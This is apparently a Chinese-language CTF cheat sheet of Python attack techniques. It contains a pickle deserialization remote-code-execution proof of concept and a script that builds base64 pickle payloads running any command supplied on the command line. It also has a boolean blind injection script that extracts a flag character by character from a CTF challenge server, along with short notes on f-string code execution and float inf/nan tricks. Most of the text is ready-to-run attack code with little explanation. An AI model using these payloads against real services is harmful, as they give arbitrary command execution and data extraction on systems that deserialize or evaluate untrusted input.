# Python

## Pickle

### RCE
poc
```
class Exploit(object):
    def __reduce__(self):
        return (os.system,('ls',))
```
利用脚本

```
import _pickle as cPickle
import sys
import base64

COMMAND = sys.argv[1]

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print(base64.b64encode(cPickle.dumps(PickleRce())))
```

## repr() 函数将对象转化为供解释器读取的形式

可以与php serialize()类比

## 字符串bool

```
>>> 'a' and True
True
>>> 'a' and False
False
>>> True and False
False
>>> 'a' or False
'a'
>>> True or False
True
>>> False or True
True
```

存在类似SQL Bool Blind的注入

```python
#coding=utf-8
import requests
import time
import sys
import string

pt= string.printable

url="http://992b9ff2-9950-49ec-8925-4fa34293d8a6.node3.buuoj.cn/"

ret = "flag{"
url = url + "cgi-bin/pycalx.py"

while True:
    l = 1
    r = 128
    while(l+1<r):
        mid = (l+r) / 2
        tmp=ret+chr(mid)
        data = {
            'value1': 'a',
            'op': '+\'',
            'value2': 'and source>FLAG#',
            'source': tmp
        }
        req=requests.post(url,data=data)
        #print req.text
        if (req.status_code != requests.codes.ok):
            continue
        if "True" in req.text:
            r=mid
        else :
            l=mid
    if(chr(l) not in pt):
        break
    ret=ret+chr(l)
    sys.stdout.write("[-]Result : -> {0} <-\r".format(ret))
    sys.stdout.flush()

print("[+]Result : ->"+ret+"<-")
```

## 浮点数比较

``float()``

``inf,nan,infinity``

## python3 ``f'{}'``

在python3.6中，将字符串用{}引起来，加上引号，并且前面加个f就可以把{}中的字符串当做代码执行

``f"{__import__('time').sleep(1)}"``

## 参考资料